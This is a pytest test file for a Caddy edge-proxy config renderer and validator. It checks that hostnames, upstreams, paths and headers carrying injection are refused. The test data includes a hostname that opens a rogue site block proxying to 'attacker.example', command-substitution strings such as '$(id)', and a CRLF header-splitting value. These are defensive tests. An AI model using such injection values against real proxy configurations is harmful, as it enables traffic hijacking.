"""The edge is the one config where a mistake is REMOTELY EXPLOITABLE.

T1 is the test that matters, and neither source repository guards against it.
"""
from __future__ import annotations

import pathlib
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "tools" / "edge"))

from render import render  # noqa: E402
from validate import (  # noqa: E402
    EdgeValueRejected,
    header_value,
    hostname,
    path_prefix,
    upstream,
)


def cfg(**over):
    base = {
        "driver": "caddy",
        "domain": "example.com",
        "tls": True,
        "acme_email": "ops@example.com",
        "routes": [{"path": "/api/*", "upstream": "api-gateway:8000"}],
    }
    base.update(over)
    return base


# ── T1 — edge-config injection. CRITICAL. ────────────────────────────────────
def test_a_hostname_cannot_open_a_new_site_block():
    """THE attack. This does not produce an INVALID config — it produces a perfectly VALID one with
    an extra site that proxies our TLS-terminated traffic to the attacker."""
    evil = 'evil.com {\n  reverse_proxy https://attacker.example\n}\nexample.com'
    with pytest.raises(EdgeValueRejected):
        render(cfg(domain=evil))


@pytest.mark.parametrize("bad", [
    "example.com {",
    "example.com}",
    "example.com\nevil.com",
    "example.com\treverse_proxy evil",
    "example.com reverse_proxy evil",
    'example.com"',
    "example.com#comment",
    "example.com;",
    "{$ENV_VAR}",              # a Caddy environment placeholder
    "example.com`id`",
    "example.com$(id)",
])
def test_every_caddyfile_metacharacter_is_refused(bad):
    """REFUSED, not escaped. Escaping is a bet that you know every metacharacter of a configuration
    language, in every version, in every context. You lose that bet eventually, and the day you do,
    the attacker owns the TLS terminator."""
    with pytest.raises(EdgeValueRejected):
        hostname(bad)


def test_a_legitimate_hostname_still_works():
    """A guard that refuses everything is not a guard, it is an outage."""
    assert hostname("api.example.com") == "api.example.com"
    assert hostname("localhost") == "localhost"
    assert hostname("10.0.0.5") == "10.0.0.5"
    assert hostname("::1") == "::1"


def test_the_upstream_is_validated_too():
    """An attacker who controls where the edge FORWARDS owns your traffic just as completely."""
    with pytest.raises(EdgeValueRejected):
        upstream("evil.example\n\treverse_proxy attacker")
    with pytest.raises(EdgeValueRejected):
        upstream("api-gateway")            # no port
    assert upstream("api-gateway:8000") == "api-gateway:8000"


def test_paths_and_headers_are_validated():
    with pytest.raises(EdgeValueRejected):
        path_prefix("/api/* { respond 200 }")
    with pytest.raises(EdgeValueRejected):
        header_value("nosniff\r\nSet-Cookie: admin=1")     # response splitting, CWE-113
    assert path_prefix("/api/v1/*") == "/api/v1/*"


# ── T8 — HSTS only when TLS is actually on ───────────────────────────────────
def test_hsts_only_when_tls_is_really_on():
    """An HSTS header over plain http does nothing except make you believe you are protected: the
    browser ignores it, and you stop looking."""
    assert "Strict-Transport-Security" in render(cfg(tls=True))

    plain = render(cfg(tls=False, domain="localhost", http_port=8080))
    assert "Strict-Transport-Security" not in plain
    assert "auto_https off" in plain


# ── the rendered shape ───────────────────────────────────────────────────────
def test_the_server_banner_is_hidden():
    assert "-Server" in render(cfg())


def test_longest_prefix_is_matched_first():
    """Caddy matches `handle` blocks IN ORDER. A short prefix declared first swallows every longer
    one behind it. Sorting in the renderer means an operator cannot create that bug by listing
    their routes in the order they happened to think of them."""
    out = render(cfg(routes=[
        {"path": "/api/*", "upstream": "api-gateway:8000"},
        {"path": "/api/v1/auth/*", "upstream": "identity-service:8000"},
    ]))
    assert out.index("/api/v1/auth/*") < out.index("handle /api/* ")


def test_an_edge_with_no_routes_is_refused():
    """An edge that routes nothing is not an edge. It is a 404 with a certificate."""
    with pytest.raises(EdgeValueRejected):
        render(cfg(routes=[]))


def test_no_fallback_means_an_explicit_404():
    out = render(cfg())
    assert "respond 404" in out


def test_an_unbuilt_driver_is_refused_not_silently_accepted():
    """nginx is a second renderer of the same shape on the day someone needs it — not a flag that
    exists today and does nothing."""
    with pytest.raises(EdgeValueRejected):
        render(cfg(driver="nginx"))


def test_the_shipped_edge_config_renders():
    """The config we actually ship must render, or the gate is checking a file nobody uses."""
    import json

    root = pathlib.Path(__file__).resolve().parents[2]
    shipped = json.loads((root / "deploy" / "edge" / "edge.json").read_text(encoding="utf-8"))
    out = render(shipped)
    assert "reverse_proxy" in out and "-Server" in out
